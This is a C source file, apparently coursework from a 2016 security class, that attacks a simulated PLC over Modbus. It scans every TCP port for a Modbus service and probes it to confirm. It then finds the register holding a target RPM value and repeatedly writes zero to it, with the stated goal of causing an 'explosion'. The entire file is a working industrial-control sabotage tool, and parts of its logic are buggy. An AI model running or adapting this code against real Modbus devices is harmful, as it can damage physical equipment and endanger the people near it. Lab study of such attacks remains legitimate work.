/**********************************************************************
!*
!* 2016 Evan Dye  All Rights Reserved.
!*
!**********************************************************************
!*
!* Author       : Evan Dye
!* Institution  : University of New Mexico
!* Course       : CS-544
!* Semester     : Spring 2016
!*
!*********************************************************************
!******************************************************************************
! Purpose:   To connect to simulated plc and modify RPM register until "expolosion"
!
!*******************************************************************************/

#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <modbus.h>

#include "options.h"

int main(int argc, char **argv)
{
	int i, j; //used for looping

	int err; //Used for modbus error checking
	options_t options;
	modbus_t *modbusConnection;
	uint8_t req_unit8[128];
	uint16_t reg[1];

	get_options(argc, argv, &options);
	print_options(&options);

	if(options.port == 0)
	{
		for(i = 1; i < 65536; ++i)
		{
			options.port = i;
			//automatic code
			modbusConnection = modbus_new_tcp(options.ipAddress, options.port);
			if(modbus_connect(modbusConnection) == -1)
			{
				modbus_free(modbusConnection);
			}
			else
			{
				//Verify that the ip/port pair is actually modbus
				for(j = 1; j < 12; ++j)
				{
					err = modbus_reply_exception(modbusConnection,req_unit8, j);
					if(err == -1)
					{
						modbus_close(modbusConnection);
						modbus_free(modbusConnection);
						break; //We've found an error code that doesn't work, so break out of the loop
					}
				}
				if(j == 12)
				{
					err = modbus_report_slave_id(modbusConnection, 127, req_unit8);
					if(err == -1)
					{
						modbus_close(modbusConnection);
						modbus_free(modbusConnection);
					}
					else
					{
						fprintf(stdout, "Using port: %d\n", options.port);
						break; //We've found a port that works, so break out of the loop
					}
				}
			}
		}
		if(i >= 65536)
		{
			fprintf(stderr, "No modbus ports found at %s\n", options.ipAddress);
			return -1;
		}
	}
	else
	{
		modbusConnection = modbus_new_tcp(options.ipAddress, options.port);
		if(modbus_connect(modbusConnection) == -1)
		{
			fprintf(stderr, "Connection failed: %s\n", modbus_strerror(errno));
			modbus_free(modbusConnection);
			return -1;
		}
		//Verify that the ip/port pair is actually modbus
		for(j = 1; j < 12; ++j)
		{
			err = modbus_reply_exception(modbusConnection,req_unit8, j);
			if(err == -1)
			{
				fprintf(stderr, "Are you sure this is a modbus connection? Error code checking failed: %s\n", modbus_strerror(errno));
				modbus_close(modbusConnection);
				modbus_free(modbusConnection);
				return -1;
			}
		}
        fprintf(stdout, "Checking slave ID...");
		err = modbus_report_slave_id(modbusConnection, 127, req_unit8);
		if(err == -1)
		{
			fprintf(stderr, "Are you sure this is a modbus connection? Slave ID checking failed: %s\n", modbus_strerror(errno));
			modbus_close(modbusConnection);
			modbus_free(modbusConnection);
			return -1;
		}
        fprintf(stdout, "Slave ID checked");
	}


	//Auto register finding
	if(options.registerAddress == -1)
	{
		i = 0;
		err = 0;
			while(err != -1)
			{
				err = modbus_read_registers(modbusConnection, i, 1, reg);
				if(abs(reg[0] - options.targetRPM) <= options.tolerence)
				{
					options.registerAddress = i;
					break;
				}
			}
	}

    while(err != -1) //Doing it this way for now, will come up with better solution at a later time
    {
            err = modbus_write_register(modbusConnection, options.registerAddress, 0);
    }

    err = modbus_write_register(modbusConnection, options.registerAddress, 0);
    if(err == -1)
    {
            fprintf(stderr, "Writing to register failed: %s\n", modbus_strerror(errno));
            modbus_close(modbusConnection);
            modbus_free(modbusConnection);
            return -1;
    }

    modbus_close(modbusConnection);
    modbus_free(modbusConnection);
    return 0;
}

